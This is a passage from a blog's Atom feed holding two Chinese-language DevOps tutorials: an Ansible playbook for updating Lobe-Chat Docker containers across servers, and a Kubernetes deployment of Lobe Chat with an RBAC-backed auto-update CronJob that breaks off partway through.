  </entry>
  
  <entry>
    <title>使用 Ansible 管理多个服务器上的容器</title>
    <link href="http://example.com/2024/09/21/%E4%BD%BF%E7%94%A8-Ansible-%E7%AE%A1%E7%90%86%E5%A4%9A%E4%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%AE%B9%E5%99%A8/"/>
    <id>http://example.com/2024/09/21/%E4%BD%BF%E7%94%A8-Ansible-%E7%AE%A1%E7%90%86%E5%A4%9A%E4%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%AE%B9%E5%99%A8/</id>
    <published>2024-09-21T10:20:56.000Z</published>
    <updated>2024-09-21T11:36:28.009Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用-Ansible-管理多个服务器上的-Lobe-Chat-Docker-容器"><a href="#使用-Ansible-管理多个服务器上的-Lobe-Chat-Docker-容器" class="headerlink" title="使用 Ansible 管理多个服务器上的 Lobe-Chat Docker 容器"></a>使用 Ansible 管理多个服务器上的 Lobe-Chat Docker 容器</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>通过这个剧本，将实现在多个服务器上自动更新 Lobe-Chat 服务，需要的步骤：</p><ul><li>停止运行中的 Lobe-Chat 容器。</li><li>删除旧版本容器。</li><li>拉取最新的 Lobe-Chat 镜像。</li><li>根据不同服务器设置对应的端口，启动 Lobe-Chat 容器。</li></ul><h2 id="剧本概述"><a href="#剧本概述" class="headerlink" title="剧本概述"></a>剧本概述</h2><p>这是我们使用的 Ansible 剧本，其中包含了几个关键任务步骤：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Manage</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">Docker</span> <span class="hljs-string">container</span> <span class="hljs-string">on</span> <span class="hljs-string">multiple</span> <span class="hljs-string">servers</span><br>  <span class="hljs-attr">hosts:</span> <span class="hljs-string">chatservers</span><br>  <span class="hljs-attr">become:</span> <span class="hljs-literal">yes</span><br><br>  <span class="hljs-attr">vars:</span><br>    <span class="hljs-attr">docker_image:</span> <span class="hljs-string">lobehub/lobe-chat</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">lobe-chat</span><br>    <span class="hljs-attr">host_ports:</span><br>      <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">host:</span> <span class="hljs-string">&quot;your_ip&quot;</span>, <span class="hljs-attr">port:</span> <span class="hljs-number">80</span> &#125;<br><br>  <span class="hljs-attr">tasks:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Set</span> <span class="hljs-string">host-specific</span> <span class="hljs-string">port</span><br>      <span class="hljs-attr">set_fact:</span><br>        <span class="hljs-attr">host_port:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; item.port &#125;&#125;</span>&quot;</span><br>      <span class="hljs-attr">with_items:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; host_ports &#125;&#125;</span>&quot;</span><br>      <span class="hljs-attr">when:</span> <span class="hljs-string">item.host</span> <span class="hljs-string">==</span> <span class="hljs-string">ansible_host</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Debug</span> <span class="hljs-string">host-specific</span> <span class="hljs-string">port</span> <span class="hljs-string">setting</span><br>      <span class="hljs-attr">debug:</span><br>        <span class="hljs-attr">msg:</span> <span class="hljs-string">&quot;Setting host_port to <span class="hljs-template-variable">&#123;&#123; item.port &#125;&#125;</span> for <span class="hljs-template-variable">&#123;&#123; ansible_host &#125;&#125;</span>&quot;</span><br>      <span class="hljs-attr">with_items:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; host_ports &#125;&#125;</span>&quot;</span><br>      <span class="hljs-attr">when:</span> <span class="hljs-string">item.host</span> <span class="hljs-string">==</span> <span class="hljs-string">ansible_host</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">if</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span> <span class="hljs-string">is</span> <span class="hljs-string">running</span><br>      <span class="hljs-attr">shell:</span> <span class="hljs-string">&quot;docker ps -q -f name=<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>      <span class="hljs-attr">register:</span> <span class="hljs-string">container_id</span><br>      <span class="hljs-attr">changed_when:</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Stop</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span> <span class="hljs-string">if</span> <span class="hljs-string">it</span> <span class="hljs-string">is</span> <span class="hljs-string">running</span><br>      <span class="hljs-attr">docker_container:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">state:</span> <span class="hljs-string">stopped</span><br>      <span class="hljs-attr">when:</span> <span class="hljs-string">container_id.stdout</span> <span class="hljs-type">!=</span> <span class="hljs-string">&quot;&quot;</span><br>      <span class="hljs-attr">ignore_errors:</span> <span class="hljs-literal">yes</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Remove</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span> <span class="hljs-string">if</span> <span class="hljs-string">it</span> <span class="hljs-string">exists</span><br>      <span class="hljs-attr">docker_container:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">state:</span> <span class="hljs-string">absent</span><br>      <span class="hljs-attr">ignore_errors:</span> <span class="hljs-literal">yes</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Pull</span> <span class="hljs-string">the</span> <span class="hljs-string">latest</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">image</span><br>      <span class="hljs-attr">docker_image:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; docker_image &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">source:</span> <span class="hljs-string">pull</span><br>        <span class="hljs-attr">force_source:</span> <span class="hljs-literal">yes</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span><br>      <span class="hljs-attr">docker_container:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; docker_image &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">state:</span> <span class="hljs-string">started</span><br>        <span class="hljs-attr">restart_policy:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attr">ports:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; host_port &#125;&#125;</span>:3210&quot;</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">OPENAI_API_KEY:</span> <span class="hljs-string">&quot;sk-iO&quot;</span><br>          <span class="hljs-attr">ACCESS_CODE:</span> <span class="hljs-string">&quot;12356&quot;</span><br>      <span class="hljs-attr">when:</span> <span class="hljs-string">host_port</span> <span class="hljs-string">is</span> <span class="hljs-string">defined</span><br></code></pre></td></tr></table></figure><h3 id="1-主机与变量定义"><a href="#1-主机与变量定义" class="headerlink" title="1. 主机与变量定义"></a>1. 主机与变量定义</h3><p>首先，定义了目标主机组 <code>chatservers</code>，并使用 <code>become: yes</code> 来确保任务以管理员权限执行。接着，通过 <code>vars</code> 定义了一些变量，如 <code>docker_image</code> 和 <code>container_name</code>，它们代表了 Lobe-Chat Docker 镜像及容器名称。此外，还定义了一个 <code>host_ports</code> 列表，其中包括了每个主机的具体端口映射信息。</p><h3 id="2-设定主机端口"><a href="#2-设定主机端口" class="headerlink" title="2. 设定主机端口"></a>2. 设定主机端口</h3><p>为了确保每个服务器能够在指定的端口上启动 Lobe-Chat 容器，我们首先通过 <code>set_fact</code> 动态设定每个服务器的端口：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Set</span> <span class="hljs-string">host-specific</span> <span class="hljs-string">port</span><br>  <span class="hljs-attr">set_fact:</span><br>    <span class="hljs-attr">host_port:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; item.port &#125;&#125;</span>&quot;</span><br>  <span class="hljs-attr">with_items:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; host_ports &#125;&#125;</span>&quot;</span><br>  <span class="hljs-attr">when:</span> <span class="hljs-string">item.host</span> <span class="hljs-string">==</span> <span class="hljs-string">ansible_host</span><br></code></pre></td></tr></table></figure><p><code>set_fact</code> 模块用于动态设定 <code>host_port</code> 变量，<code>when</code> 条件判断当前任务只在匹配的服务器上执行。</p><p>通过 <code>debug</code> 模块，可以输出一些调试信息，以确保变量设定正确：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Debug</span> <span class="hljs-string">host-specific</span> <span class="hljs-string">port</span> <span class="hljs-string">setting</span><br>  <span class="hljs-attr">debug:</span><br>    <span class="hljs-attr">msg:</span> <span class="hljs-string">&quot;Setting host_port to <span class="hljs-template-variable">&#123;&#123; item.port &#125;&#125;</span> for <span class="hljs-template-variable">&#123;&#123; ansible_host &#125;&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><h3 id="3-检查并停止现有的-Lobe-Chat-容器"><a href="#3-检查并停止现有的-Lobe-Chat-容器" class="headerlink" title="3. 检查并停止现有的 Lobe-Chat 容器"></a>3. 检查并停止现有的 Lobe-Chat 容器</h3><p>接下来，通过 <code>docker ps</code> 命令检查当前是否有名为 <code>lobe-chat</code> 的 Docker 容器在运行：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">if</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span> <span class="hljs-string">is</span> <span class="hljs-string">running</span><br>  <span class="hljs-attr">shell:</span> <span class="hljs-string">&quot;docker ps -q -f name=<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>  <span class="hljs-attr">register:</span> <span class="hljs-string">container_id</span><br>  <span class="hljs-attr">changed_when:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>如果容器在运行，则通过以下任务将其停止并移除：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Stop</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span> <span class="hljs-string">if</span> <span class="hljs-string">it</span> <span class="hljs-string">is</span> <span class="hljs-string">running</span><br>  <span class="hljs-attr">docker_container:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>    <span class="hljs-attr">state:</span> <span class="hljs-string">stopped</span><br>  <span class="hljs-attr">when:</span> <span class="hljs-string">container_id.stdout</span> <span class="hljs-type">!=</span> <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-attr">ignore_errors:</span> <span class="hljs-literal">yes</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Remove</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span> <span class="hljs-string">if</span> <span class="hljs-string">it</span> <span class="hljs-string">exists</span><br>  <span class="hljs-attr">docker_container:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>    <span class="hljs-attr">state:</span> <span class="hljs-string">absent</span><br>  <span class="hljs-attr">ignore_errors:</span> <span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure><p><code>ignore_errors: yes</code> 确保即使停止或删除容器失败，剧本也会继续执行。</p><h3 id="4-拉取最新-Lobe-Chat-镜像并启动容器"><a href="#4-拉取最新-Lobe-Chat-镜像并启动容器" class="headerlink" title="4. 拉取最新 Lobe-Chat 镜像并启动容器"></a>4. 拉取最新 Lobe-Chat 镜像并启动容器</h3><p>拉取最新的 Lobe-Chat 镜像，并启动容器是最后的关键步骤。通过 <code>docker_image</code> 模块拉取镜像：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Pull</span> <span class="hljs-string">the</span> <span class="hljs-string">latest</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">image</span><br>  <span class="hljs-attr">docker_image:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; docker_image &#125;&#125;</span>&quot;</span><br>    <span class="hljs-attr">source:</span> <span class="hljs-string">pull</span><br>    <span class="hljs-attr">force_source:</span> <span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure><p>然后使用 <code>docker_container</code> 模块启动容器，配置环境变量及端口映射：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span><br>  <span class="hljs-attr">docker_container:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; docker_image &#125;&#125;</span>&quot;</span><br>    <span class="hljs-attr">state:</span> <span class="hljs-string">started</span><br>    <span class="hljs-attr">restart_policy:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; host_port &#125;&#125;</span>:3210&quot;</span><br>    <span class="hljs-attr">env:</span><br>      <span class="hljs-attr">OPENAI_API_KEY:</span> <span class="hljs-string">&quot;sk-iO&quot;</span><br>      <span class="hljs-attr">ACCESS_CODE:</span> <span class="hljs-string">&quot;12356&quot;</span><br></code></pre></td></tr></table></figure><p>确保 <code>ports</code> 中定义的 <code>host_port</code> 变量已被正确设置，使每个服务器上的容器都在指定端口运行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这个 Ansible 剧本，可以轻松管理多个服务器上的 Docker 容器，自动执行拉取镜像、停止旧容器、删除旧容器和启动新容器的流程。由于 Ansible 是无代理的（agentless），剧本执行非常灵活，特别适用于云环境中的大规模管理。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用-Ansible-管理多个服务器上的-Lobe-Chat-Docker-容器&quot;&gt;&lt;a href=&quot;#使用-Ansible-管理多个服务器上的-Lobe-Chat-Docker-容器&quot; class=&quot;headerlink&quot; title=&quot;使用 Ansible 管</summary>
      
    
    
    
    
    <category term="Ansible" scheme="http://example.com/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>使用 Kubernetes 搭建 Lobe Chat 并实现自动化更新</title>
    <link href="http://example.com/2024/09/21/%E4%BD%BF%E7%94%A8-Kubernetes-%E6%90%AD%E5%BB%BA-Lobe-Chat-%E5%B9%B6%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9B%B4%E6%96%B0/"/>
    <id>http://example.com/2024/09/21/%E4%BD%BF%E7%94%A8-Kubernetes-%E6%90%AD%E5%BB%BA-Lobe-Chat-%E5%B9%B6%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9B%B4%E6%96%B0/</id>
    <published>2024-09-21T09:27:57.000Z</published>
    <updated>2024-09-21T10:12:06.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用-Kubernetes-搭建-Lobe-Chat-并实现自动化更新"><a href="#使用-Kubernetes-搭建-Lobe-Chat-并实现自动化更新" class="headerlink" title="使用 Kubernetes 搭建 Lobe Chat 并实现自动化更新"></a>使用 Kubernetes 搭建 Lobe Chat 并实现自动化更新</h1><p>使用 Kubernetes (k8s) 部署 Lobe Chat 应用,并设置自动化更新机制。这种方法可以让你轻松地管理和维护 Lobe Chat 服务,确保它始终运行最新版本。</p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul><li>已安装并配置好 Kubernetes 集群</li><li>API 密钥</li></ul><h2 id="步骤-1-创建配置文件"><a href="#步骤-1-创建配置文件" class="headerlink" title="步骤 1: 创建配置文件"></a>步骤 1: 创建配置文件</h2><p>首先,创建两个 YAML 文件来配置我们的部署。</p><h3 id="lobe-yaml"><a href="#lobe-yaml" class="headerlink" title="lobe.yaml"></a>lobe.yaml</h3><p>这个文件包含了 Lobe Chat 的主要部署配置:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ConfigMap</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-config</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">AZURE_API_KEY:</span> <span class="hljs-string">&quot;your_azure_api_key&quot;</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span>  <span class="hljs-comment"># 将副本数量设置为3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">lobe-chat</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">lobe-chat</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">lobehub/lobe-chat:latest</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">3210</span><br>        <span class="hljs-attr">envFrom:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">configMapRef:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-config</span><br>        <span class="hljs-attr">imagePullPolicy:</span> <span class="hljs-string">Always</span>  <span class="hljs-comment"># 确保每次部署时都会拉取最新的镜像</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-service</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">lobe-chat</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">3210</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">3210</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">LoadBalancer</span>  <span class="hljs-comment"># 使用 LoadBalancer 类型实现负载均衡</span><br></code></pre></td></tr></table></figure><p>确保将示例中的 API 密钥和访问代码替换为你自己的值。</p><h3 id="lobe-update-yaml"><a href="#lobe-update-yaml" class="headerlink" title="lobe-update.yaml"></a>lobe-update.yaml</h3><p>这个文件设置了自动更新机制:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 创建一个新的 ServiceAccount，名为 lobe-chat-updater</span><br><span class="hljs-comment"># 该 ServiceAccount 将被 CronJob 使用，以获得操作 Kubernetes API 的权限</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-updater</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-comment"># 定义一个 Role，名为 lobe-chat-updater-role</span><br><span class="hljs-comment"># 该 Role 允许持有者对 &quot;deployments&quot; 资源执行 get、list、watch、update 和 patch 操作</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Role</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-updater-role</span><br><span class="hljs-attr">rules:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroups:</span> [<span class="hljs-string">&quot;apps&quot;</span>]  <span class="hljs-comment"># &quot;apps&quot; API 组包括了 &quot;deployments&quot; 资源</span><br>  <span class="hljs-attr">resources:</span> [<span class="hljs-string">&quot;deployments&quot;</span>]  <span class="hljs-comment"># 目标资源类型为 &quot;deployments&quot;</span><br>  <span class="hljs-attr">verbs:</span> [<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;watch&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;patch&quot;</span>]  <span class="hljs-comment"># 允许执行的操作</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-comment"># 定义一个 RoleBinding，将上面定义的 Role 绑定到 lobe-chat-updater ServiceAccount</span><br><span class="hljs-comment"># 这使得 lobe-chat-updater 可以使用 lobe-chat-updater-role 中定义的权限</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">RoleBinding</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-updater-binding</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">subjects:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-updater</span>  <span class="hljs-comment"># 绑定的 ServiceAccount</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">roleRef:</span><br>  <span class="hljs-attr">kind:</span> <span class="hljs-string">Role</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-updater-role</span>  <span class="hljs-comment"># 绑定的 Role</span><br>  <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-comment"># 定义一个 CronJob，名为 lobe-chat-update</span><br><span class="hljs-comment"># 该 CronJob 将定期执行滚动更新，确保部署始终使用最新的镜像</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">batch/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">CronJob</span><br><span class="hljs-attr">metadata:</span><br>  <span 